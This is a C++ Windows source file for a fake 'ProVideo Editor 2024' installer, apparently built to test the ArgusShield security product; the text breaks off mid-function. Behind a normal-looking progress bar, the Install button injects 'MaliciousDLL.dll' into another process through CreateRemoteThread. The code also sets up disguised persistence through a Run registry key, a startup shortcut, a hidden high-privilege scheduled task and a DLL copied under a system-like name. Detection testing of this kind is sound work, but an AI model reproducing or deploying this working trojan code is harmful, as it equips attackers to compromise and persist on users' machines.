#include "framework.h"
#include "FakeSoftwareInstaller.h"
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <thread>
#include <fstream>
#include <tlhelp32.h>
#include <sstream>
#include <ShlObj.h>

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Log file path - consistent with Injector and MaliciousDLL
#define ARGUSSHIELD_LOG_FILE "C:\\ArgusShield_injection_proof.txt"
#define ARGUSSHIELD_INSTALLER_LOG "C:\\ArgusShield_installer_log.txt"

// Window Controls
HWND hwndMain;
HWND hwndWelcomeText;
HWND hwndDescriptionText;
HWND hwndLicenseCheck;
HWND hwndProgressBar;
HWND hwndStatusText;
HWND hwndProgressDetail;
HWND hwndInstallBtn;
HWND hwndCancelBtn;
HWND hwndFinishBtn;

// State
bool isInstalling = false;
bool injectionSuccessful = false;
DWORD spawnedTargetPID = 0;

// Function declarations
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void CreateControls(HWND hwnd);
void StartInstallation();
void PerformMaliciousInjection();
DWORD GetProcessIdByName(const wchar_t* processName);
DWORD SpawnTargetProcess();
DWORD FindExplorerProcess();
bool InjectDLL(DWORD processId, const char* dllPath);
std::string GetDLLPath();
void LogActivity(const std::string& message);

// Persistence mechanisms
bool EstablishPersistence();
bool AddRegistryPersistence();
bool AddStartupFolderPersistence();
bool AddScheduledTaskPersistence();
void CopyDLLToSystem();

// Entry point
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    // Initialize common controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS | ICC_STANDARD_CLASSES;
    InitCommonControlsEx(&icex);

    // Register window class
    const wchar_t CLASS_NAME[] = L"FakeSoftwareInstallerClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = CreateSolidBrush(RGB(240, 240, 240));
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);

    RegisterClass(&wc);

    // Create window
    hwndMain = CreateWindowEx(
        0,
        CLASS_NAME,
        L"ProVideo Editor 2024 - Installation Wizard",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 600, 450,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );

    if (hwndMain == nullptr)
    {
        return 0;
    }

    // Center window on screen
    RECT rect;
    GetWindowRect(hwndMain, &rect);
    int windowWidth = rect.right - rect.left;
    int windowHeight = rect.bottom - rect.top;
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(hwndMain, nullptr,
        (screenWidth - windowWidth) / 2,
        (screenHeight - windowHeight) / 2,
        0, 0, SWP_NOSIZE | SWP_NOZORDER);

    CreateControls(hwndMain);

    ShowWindow(hwndMain, nCmdShow);
    UpdateWindow(hwndMain);

    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

void CreateControls(HWND hwnd)
{
    HFONT hFontTitle = CreateFont(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    HFONT hFontNormal = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    HFONT hFontButton = CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");

    // Header background
    HWND hwndHeader = CreateWindow(L"STATIC", L"",
        WS_CHILD | WS_VISIBLE | SS_OWNERDRAW,
        0, 0, 600, 80,
        hwnd, (HMENU)100, nullptr, nullptr);

    // Logo circle (simulated with text)
    HWND hwndLogo = CreateWindow(L"STATIC", L"●",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        20, 15, 50, 50,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndLogo, WM_SETFONT, (WPARAM)CreateFont(48, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Title in header
    HWND hwndHeaderTitle = CreateWindow(L"STATIC", L"ProVideo Editor 2024",
        WS_CHILD | WS_VISIBLE,
        80, 20, 400, 30,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndHeaderTitle, WM_SETFONT, (WPARAM)hFontTitle, TRUE);

    // Subtitle
    HWND hwndSubtitle = CreateWindow(L"STATIC", L"Professional Video Editing Software",
        WS_CHILD | WS_VISIBLE,
        80, 50, 400, 20,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndSubtitle, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Welcome text
    hwndWelcomeText = CreateWindow(L"STATIC", L"Welcome to ProVideo Editor Setup",
        WS_CHILD | WS_VISIBLE,
        40, 120, 520, 30,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndWelcomeText, WM_SETFONT, (WPARAM)CreateFont(22, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Description
    hwndDescriptionText = CreateWindow(L"STATIC",
        L"Ready to install ProVideo Editor 2024.\r\n\r\nClick 'Install' to start the installation.",
        WS_CHILD | WS_VISIBLE,
        40, 160, 520, 60,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndDescriptionText, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // License checkbox - HIDDEN (not needed for one-click attack)
    hwndLicenseCheck = CreateWindow(L"BUTTON", L"I accept the terms and conditions",
        WS_CHILD | BS_AUTOCHECKBOX,  // Removed WS_VISIBLE
        40, 240, 400, 25,
        hwnd, (HMENU)1, nullptr, nullptr);
    SendMessage(hwndLicenseCheck, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Progress bar (hidden initially)
    hwndProgressBar = CreateWindowEx(0, PROGRESS_CLASS, nullptr,
        WS_CHILD | PBS_SMOOTH,
        40, 200, 520, 30,
        hwnd, nullptr, nullptr, nullptr);

    // Status text (hidden initially)
    hwndStatusText = CreateWindow(L"STATIC", L"Installing...",
        WS_CHILD,
        40, 160, 520, 25,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndStatusText, WM_SETFONT, (WPARAM)CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI"), TRUE);

    // Progress detail (hidden initially)
    hwndProgressDetail = CreateWindow(L"STATIC", L"Preparing installation...",
        WS_CHILD,
        40, 240, 520, 20,
        hwnd, nullptr, nullptr, nullptr);
    SendMessage(hwndProgressDetail, WM_SETFONT, (WPARAM)hFontNormal, TRUE);

    // Buttons
    hwndCancelBtn = CreateWindow(L"BUTTON", L"Cancel",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        360, 360, 100, 35,
        hwnd, (HMENU)2, nullptr, nullptr);
    SendMessage(hwndCancelBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);

    hwndInstallBtn = CreateWindow(L"BUTTON", L"Install",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,  // Removed WS_DISABLED - enabled by default
        470, 360, 100, 35,
        hwnd, (HMENU)3, nullptr, nullptr);
    SendMessage(hwndInstallBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);

    hwndFinishBtn = CreateWindow(L"BUTTON", L"Finish",
        WS_CHILD | BS_PUSHBUTTON,
        470, 360, 100, 35,
        hwnd, (HMENU)4, nullptr, nullptr);
    SendMessage(hwndFinishBtn, WM_SETFONT, (WPARAM)hFontButton, TRUE);
}
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        HWND hwndStatic = (HWND)lParam;

        // Header background (dark blue)
        if (GetDlgCtrlID(hwndStatic) == 100)
        {
            SetBkColor(hdcStatic, RGB(44, 62, 80));
            return (LRESULT)CreateSolidBrush(RGB(44, 62, 80));
        }

        // White text for header elements
        if (hwndStatic == FindWindowEx(hwnd, nullptr, L"STATIC", L"ProVideo Editor 2024") ||
            hwndStatic == FindWindowEx(hwnd, nullptr, L"STATIC", L"Professional Video Editing Software"))
        {
            SetTextColor(hdcStatic, RGB(255, 255, 255));
            SetBkColor(hdcStatic, RGB(44, 62, 80));
            return (LRESULT)CreateSolidBrush(RGB(44, 62, 80));
        }

        // Logo color (blue)
        if (hwndStatic == FindWindowEx(hwnd, nullptr, L"STATIC", L"●"))
        {
            SetTextColor(hdcStatic, RGB(52, 152, 219));
            SetBkColor(hdcStatic, RGB(44, 62, 80));
            return (LRESULT)CreateSolidBrush(RGB(44, 62, 80));
        }

        // Default: transparent background
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LRESULT)GetStockObject(NULL_BRUSH);
    }

    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        int wmEvent = HIWORD(wParam);

        // Install button - ONE CLICK ATTACK
        if (wmId == 3 && wmEvent == BN_CLICKED)
        {
            if (!isInstalling)
            {
                StartInstallation();
            }
        }

        // Cancel/Finish buttons
        if (wmId == 2 || wmId == 4)
        {
            DestroyWindow(hwnd);
        }

        break;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        // Draw header background
        RECT headerRect = { 0, 0, 600, 80 };
        HBRUSH headerBrush = CreateSolidBrush(RGB(44, 62, 80));
        FillRect(hdc, &headerRect, headerBrush);
        DeleteObject(headerBrush);

        EndPaint(hwnd, &ps);
        return 0;
    }
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
// Helper: check if the spawned target process is still alive
static bool IsTargetProcessAlive()
{
    if (spawnedTargetPID == 0) return false;

    HANDLE hTarget = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, spawnedTargetPID);
    if (!hTarget) return false;

    DWORD exitCode;
    bool alive = (GetExitCodeProcess(hTarget, &exitCode) && exitCode == STILL_ACTIVE);
    CloseHandle(hTarget);
    return alive;
}

// Helper: show the "blocked" error and terminate the installer
static void HandleBlockedAttack()
{
    LogActivity("[BLOCKED] ArgusShield killed the target process — attack was blocked!");

    MessageBox(hwndMain,
        L"ArgusShield has successfully DETECTED and BLOCKED this attack.\n\n"
        L"The target process and/or this installer were terminated to prevent payload execution.",
        L"ERROR: Attack Blocked",
        MB_OK | MB_ICONERROR);

    ExitProcess(1);
}

void StartInstallation()
{
    isInstalling = true;

    // Hide initial UI
    ShowWindow(hwndWelcomeText, SW_HIDE);
    ShowWindow(hwndDescriptionText, SW_HIDE);
    ShowWindow(hwndLicenseCheck, SW_HIDE);
    ShowWindow(hwndInstallBtn, SW_HIDE);

    // Show progress UI
    ShowWindow(hwndStatusText, SW_SHOW);
    ShowWindow(hwndProgressBar, SW_SHOW);
    ShowWindow(hwndProgressDetail, SW_SHOW);

    // Start installation in separate thread
    std::thread installThread([]() {

        const wchar_t* steps[] = {
            L"Extracting files...",
            L"Installing components...",
            L"Configuring settings...",
            L"Registering application...",
            L"Performing system optimization...",  // ← INJECTION HAPPENS HERE
            L"Finalizing installation..."
        };

        SendMessage(hwndProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));

        for (int i = 0; i < 6; i++)
        {
            SetWindowText(hwndProgressDetail, steps[i]);

            // Simulate progress
            for (int j = 0; j < 17; j++)
            {
                int progress = (i * 17) + j;
                SendMessage(hwndProgressBar, PBM_SETPOS, progress, 0);
                Sleep(100);

                // After injection phase, actively poll for ArgusShield blocking
                if (i > 4 && spawnedTargetPID != 0 && injectionSuccessful)
                {
                    if (!IsTargetProcessAlive())
                    {
                        HandleBlockedAttack();
                        return;
                    }
                }
            }

            // Perform DLL injection during "system optimization"
            if (i == 4)
            {
                LogActivity("Starting malicious injection phase...");
                PerformMaliciousInjection();
            }
        }

        // Complete
        SendMessage(hwndProgressBar, PBM_SETPOS, 100, 0);

        // Show success UI
        SetWindowText(hwndStatusText, L"Installation Complete!");
        SetWindowText(hwndProgressDetail, L"ProVideo Editor has been successfully installed.");

        ShowWindow(hwndProgressBar, SW_HIDE);
        ShowWindow(hwndCancelBtn, SW_HIDE);
        ShowWindow(hwndFinishBtn, SW_SHOW);

        // Poll for up to 5 seconds (every 500ms) to give ArgusShield time to react
        // This catches memory-scanner-based detections that run on a 2s interval
        for (int poll = 0; poll < 10; poll++)
        {
            Sleep(500);

            if (spawnedTargetPID != 0 && injectionSuccessful && !IsTargetProcessAlive())
            {
                HandleBlockedAttack();
                return;
            }
        }

        // If we get here, ArgusShield did NOT block — attack was successful
        if (injectionSuccessful && IsTargetProcessAlive())
        {
            MessageBox(hwndMain,
                L"Installation completed successfully!\n\n"
                L"[ArgusShield] DLL injection was performed successfully.\n"
                L"Check C:\\ArgusShield_injection_proof.txt for details.",
                L"ProVideo Editor - Setup Complete",
                MB_OK | MB_ICONINFORMATION);
        }
        else
        {
            HandleBlockedAttack();
            return;
        }

        });

    installThread.detach();
}

void PerformMaliciousInjection()
{
    try
    {
        LogActivity("============================================");
        LogActivity("ArgusShield Attack Simulator - Injection Phase");
        LogActivity("============================================");
        LogActivity("Technique: LoadLibrary DLL Injection");
        LogActivity("MITRE ATT&CK: T1055.001");
        LogActivity("");
        LogActivity("[MODE] Visible Mode - Spawns notepad.exe");
        LogActivity("[INFO] For stealth mode, edit code to use FindExplorerProcess() first");
        LogActivity("");

        // Step 0: Establish persistence mechanisms
        LogActivity("[STEP 0] Establishing persistence mechanisms...");
        if (EstablishPersistence())
        {
            LogActivity("[SUCCESS] Persistence established!");
        }
        else
        {
            LogActivity("[WARNING] Some persistence mechanisms failed");
        }

        // Step 1: Spawn target process (notepad.exe for visibility)
        // Note: For stealth in production, use FindExplorerProcess() instead
        LogActivity("[STEP 1] Spawning target process (notepad.exe)...");
        spawnedTargetPID = SpawnTargetProcess();

        // Fallback: Try explorer.exe if notepad spawn fails
        if (spawnedTargetPID == 0)
        {
            LogActivity("[INFO] Notepad spawn failed, trying explorer.exe...");
            spawnedTargetPID = FindExplorerProcess();
        }

        if (spawnedTargetPID == 0)
        {
            LogActivity("[ERROR] Failed to find/spawn target process!");
            LogActivity("[ERROR] Both notepad.exe spawn and explorer.exe search failed");
            injectionSuccessful = false;
            return;
        }

        LogActivity("[SUCCESS] Target process acquired: PID " + std::to_string(spawnedTargetPID));

        // Step 2: Get DLL path
        LogActivity("[STEP 2] Resolving MaliciousDLL.dll path...");
        std::string dllPathStr = GetDLLPath();

        // Check if DLL exists
        std::ifstream dllCheck(dllPathStr);
        if (!dllCheck.good())
        {
            LogActivity("[ERROR] DLL not found at: " + dllPathStr);
            LogActivity("[INFO] Please ensure MaliciousDLL.dll is in the same folder as this executable");
            injectionSuccessful = false;
            return;
        }
        dllCheck.close();

        LogActivity("[SUCCESS] DLL found: " + dllPathStr);

        // Step 3: Perform injection
        LogActivity("[STEP 3] Performing LoadLibrary injection...");
        bool success = InjectDLL(spawnedTargetPID, dllPathStr.c_str());

        if (success)
        {
            LogActivity("");
            LogActivity("============================================");
            LogActivity("[SUCCESS] DLL INJECTION COMPLETED!");
            LogActivity("============================================");
            LogActivity("Check proof file: " + std::string(ARGUSSHIELD_LOG_FILE));
            LogActivity("Check DLL activity: C:\\ArgusShield_dll_activity.txt");
            LogActivity("");
            LogActivity("[INFO] Notepad window should be visible with DLL injected");
            injectionSuccessful = true;
        }
        else
        {
            LogActivity("[ERROR] DLL injection failed");
            LogActivity("[ERROR] Check if running with administrator privileges");
            LogActivity("[ERROR] Ensure MaliciousDLL.dll is in the same folder");
            injectionSuccessful = false;
        }
    }
    catch (...)
    {
        LogActivity("[EXCEPTION] Error during injection");
        injectionSuccessful = false;
    }
}
DWORD SpawnTargetProcess()
{
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Spawn notepad.exe as target
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi))
    {
        LogActivity("CreateProcess failed. Error: " + std::to_string(GetLastError()));
        return 0;
    }

    // Wait until the target process finishes its UI initialization.
    // WaitForInputIdle ensures the message loop is up and all initial
    // DLLs have been loaded, so our injection won't race against the loader.
    DWORD waitResult = WaitForInputIdle(pi.hProcess, 5000);
    if (waitResult != 0)
    {
        LogActivity("WaitForInputIdle returned " + std::to_string(waitResult) + " — proceeding anyway");
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    // Extra safety margin for module initialization
    Sleep(1000);

    return pi.dwProcessId;
}

std::string GetDLLPath()
{
    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    
    std::string pathStr(exePath);
    size_t pos = pathStr.find_last_of("\\");
    std::string dllPath = pathStr.substr(0, pos + 1) + "MaliciousDLL.dll";
    
    return dllPath;
}

DWORD GetProcessIdByName(const wchar_t* processName)
{
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(snapshot, &pe32))
        {
            do
            {
                if (_wcsicmp(pe32.szExeFile, processName) == 0)
                {
                    processId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe32));
        }
        CloseHandle(snapshot);
    }

    return processId;
}

bool InjectDLL(DWORD processId, const char* dllPath)
{
    HANDLE hProcess = nullptr;
    LPVOID pDllPath = nullptr;
    HANDLE hThread = nullptr;

    try
    {
        LogActivity("  -> Opening target process...");

        // Open process with required permissions
        hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            FALSE, processId);

        if (hProcess == nullptr)
        {
            LogActivity("  -> FAILED: OpenProcess error " + std::to_string(GetLastError()));
            return false;
        }
        LogActivity("  -> Process handle acquired");

        // Allocate memory in target process (VirtualAllocEx)
        LogActivity("  -> Allocating memory (VirtualAllocEx)...");
        size_t dllPathSize = strlen(dllPath) + 1;
        pDllPath = VirtualAllocEx(hProcess, nullptr, dllPathSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (pDllPath == nullptr)
        {
            LogActivity("  -> FAILED: VirtualAllocEx error " + std::to_string(GetLastError()));
            CloseHandle(hProcess);
            return false;
        }
        
        std::stringstream ss;
        ss << "  -> Memory allocated at 0x" << std::hex << (DWORD_PTR)pDllPath;
        LogActivity(ss.str());

        // Write DLL path to target memory (WriteProcessMemory)
        LogActivity("  -> Writing DLL path (WriteProcessMemory)...");
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, pDllPath, dllPath, dllPathSize, &bytesWritten))
        {
            LogActivity("  -> FAILED: WriteProcessMemory error " + std::to_string(GetLastError()));
            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        LogActivity("  -> Wrote " + std::to_string(bytesWritten) + " bytes");

        // Get LoadLibraryA address
        LogActivity("  -> Resolving LoadLibraryA address...");
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");

        if (pLoadLibraryA == nullptr)
        {
            LogActivity("  -> FAILED: GetProcAddress error");
            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        std::stringstream ss2;
        ss2 << "  -> LoadLibraryA at 0x" << std::hex << (DWORD_PTR)pLoadLibraryA;
        LogActivity(ss2.str());

        // Create remote thread (CreateRemoteThread)
        LogActivity("  -> Creating remote thread (CreateRemoteThread)...");
        hThread = CreateRemoteThread(hProcess, nullptr, 0,
            (LPTHREAD_START_ROUTINE)pLoadLibraryA,
            pDllPath, 0, nullptr);

        if (hThread == nullptr)
        {
            LogActivity("  -> FAILED: CreateRemoteThread error " + std::to_string(GetLastError()));
            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        LogActivity("  -> Remote thread created successfully");

        // Wait for the remote thread to finish (LoadLibraryA call)
        LogActivity("  -> Waiting for DLL to load...");
        DWORD waitRes = WaitForSingleObject(hThread, 10000);
        if (waitRes == WAIT_TIMEOUT)
        {
            LogActivity("  -> WARNING: Remote thread timed out after 10 seconds");
        }
        
        // Get the exit code — this is the HMODULE returned by LoadLibraryA.
        // A value of 0 means LoadLibraryA returned NULL (DLL failed to load).
        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        
        if (exitCode == 0)
        {
            LogActivity("  -> WARNING: LoadLibraryA returned NULL — DLL may have failed to load");
            LogActivity("  -> Check if the DLL is a valid 64-bit binary and all dependencies are present");
        }
        else
        {
            std::stringstream ss3;
            ss3 << "  -> LoadLibraryA returned module handle: 0x" << std::hex << exitCode;
            LogActivity(ss3.str());
        }
        
        // Step 5: Memory protection cleanup for stealth (RWX → RX)
        // Change memory permissions to look more legitimate
        LogActivity("  -> Cleaning up memory permissions (stealth)...");
        DWORD oldProtect;
        if (VirtualProtectEx(hProcess, pDllPath, dllPathSize, PAGE_READONLY, &oldProtect))
        {
            LogActivity("  -> Memory permissions changed to read-only");
        }
        
        LogActivity("  -> Injection complete!");

        // Cleanup handles properly for process stability
        CloseHandle(hThread);
        // Note: We don't free pDllPath immediately to maintain DLL path in memory
        // This is intentional for persistence - the memory will be freed when process terminates
        CloseHandle(hProcess);

        return true;
    }
    catch (...)
    {
        if (hThread) CloseHandle(hThread);
        if (pDllPath && hProcess) VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        if (hProcess) CloseHandle(hProcess);
        return false;
    }
}

void LogActivity(const std::string& message)
{
    std::ofstream logFile(ARGUSSHIELD_INSTALLER_LOG, std::ios::app);

    SYSTEMTIME st;
    GetLocalTime(&st);

    char timestamp[64];
    sprintf_s(timestamp, "[%04d-%02d-%02d %02d:%02d:%02d] ",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    logFile << timestamp << message << std::endl;
    logFile.close();
}

// ============================================================
// PERSISTENCE MECHANISMS - Attacker maintains access after reboot
// ============================================================

// Find explorer.exe process (trusted/common process for stealth injection)
DWORD FindExplorerProcess()
{
    return GetProcessIdByName(L"explorer.exe");
}

// Copy DLL to a system-like location for persistence
void CopyDLLToSystem()
{
    try
    {
        std::string srcDll = GetDLLPath();
        
        // Copy to ProgramData (appears legitimate)
        char programData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programData)))
        {
            std::string destFolder = std::string(programData) + "\\Microsoft\\Windows\\";
            CreateDirectoryA(destFolder.c_str(), NULL);
            
            std::string destPath = destFolder + "SystemHelper.dll";
            
            // Copy the DLL
            if (CopyFileA(srcDll.c_str(), destPath.c_str(), FALSE))
            {
                LogActivity("[PERSISTENCE] DLL copied to: " + destPath);
            }
        }
    }
    catch (...)
    {
        LogActivity("[PERSISTENCE] Failed to copy DLL to system location");
    }
}

// Method 1: Registry Run Key Persistence (MITRE ATT&CK T1547.001)
bool AddRegistryPersistence()
{
    try
    {
        LogActivity("[PERSISTENCE] Adding Registry Run key (T1547.001)...");
        
        HKEY hKey;
        LONG result = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            KEY_SET_VALUE,
            &hKey);
        
        if (result != ERROR_SUCCESS)
        {
            LogActivity("[PERSISTENCE] Failed to open Run key");
            return false;
        }
        
        // Get current executable path
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        // Add persistence entry
        result = RegSetValueExA(
            hKey,
            "ProVideoEditor",  // Disguised name
            0,
            REG_SZ,
            (BYTE*)exePath,
            (DWORD)strlen(exePath) + 1);
        
        RegCloseKey(hKey);
        
        if (result == ERROR_SUCCESS)
        {
            LogActivity("[PERSISTENCE] Registry Run key added successfully");
            LogActivity("[PERSISTENCE] Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ProVideoEditor");
            return true;
        }
        
        return false;
    }
    catch (...)
    {
        LogActivity("[PERSISTENCE] Exception adding registry persistence");
        return false;
    }
}

// Method 2: Startup Folder Persistence (MITRE ATT&CK T1547.001)
bool AddStartupFolderPersistence()
{
    try
    {
        LogActivity("[PERSISTENCE] Adding Startup folder entry (T1547.001)...");
        
        // Get Startup folder path
        char startupPath[MAX_PATH];
        if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
        {
            LogActivity("[PERSISTENCE] Failed to get Startup folder path");
            return false;
        }
        
        // Get current executable path
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        // Create shortcut path
        std::string shortcutPath = std::string(startupPath) + "\\ProVideoUpdater.lnk";
        
        // Initialize COM
        CoInitialize(NULL);
        
        IShellLinkA* pShellLink = NULL;
        HRESULT hr = CoCreateInstance(
            CLSID_ShellLink,
            NULL,
            CLSCTX_INPROC_SERVER,
            IID_IShellLinkA,
            (void**)&pShellLink);
        
        if (SUCCEEDED(hr))
        {
            pShellLink->SetPath(exePath);
            pShellLink->SetDescription("ProVideo Editor Update Service");
            pShellLink->SetWorkingDirectory("C:\\");
            
            IPersistFile* pPersistFile = NULL;
            hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
            
            if (SUCCEEDED(hr))
            {
                wchar_t wShortcutPath[MAX_PATH];
                MultiByteToWideChar(CP_ACP, 0, shortcutPath.c_str(), -1, wShortcutPath, MAX_PATH);
                
                hr = pPersistFile->Save(wShortcutPath, TRUE);
                pPersistFile->Release();
                
                if (SUCCEEDED(hr))
                {
                    LogActivity("[PERSISTENCE] Startup shortcut created: " + shortcutPath);
                    pShellLink->Release();
                    CoUninitialize();
                    return true;
                }
            }
            pShellLink->Release();
        }
        
        CoUninitialize();
        LogActivity("[PERSISTENCE] Failed to create startup shortcut");
        return false;
    }
    catch (...)
    {
        LogActivity("[PERSISTENCE] Exception adding startup folder persistence");
        return false;
    }
}

// Method 3: Scheduled Task Persistence (MITRE ATT&CK T1053.005)
bool AddScheduledTaskPersistence()
{
    try
    {
        LogActivity("[PERSISTENCE] Adding Scheduled Task (T1053.005)...");
        
        // Get current executable path
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        // Create scheduled task using schtasks.exe (legitimate Windows binary)
        std::string command = "schtasks /create /tn \"ProVideoUpdate\" /tr \"\\\"";
        command += exePath;
        command += "\\\"\" /sc onlogon /rl highest /f";
        
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;  // Hidden execution
        
        PROCESS_INFORMATION pi;
        
        std::string cmdLine = "cmd.exe /c " + command;
        
        if (CreateProcessA(
            NULL,
            (LPSTR)cmdLine.c_str(),
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi))
        {
            WaitForSingleObject(pi.hProcess, 5000);
            
            DWORD exitCode;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            
            if (exitCode == 0)
            {
                LogActivity("[PERSISTENCE] Scheduled task created: ProVideoUpdate");
                return true;
            }
        }
        
        LogActivity("[PERSISTENCE] Failed to create scheduled task");
        return false;
    }
    catch (...)
    {
        LogActivity("[PERSISTENCE] Exception adding scheduled task");
        return false;
    }
}

// Main persistence function - tries multiple methods
bool EstablishPersistence()
{
    LogActivity("============================================");
    LogActivity("ESTABLISHING PERSISTENCE MECHANISMS");
    LogActivity("============================================");
    
    int successCount = 0;
    
    // Copy DLL to system location first
    CopyDLLToSystem();
    
    // Method 1: Registry Run key
    if (AddRegistryPersistence())
        successCount++;
    
    // Method 2: Startup folder
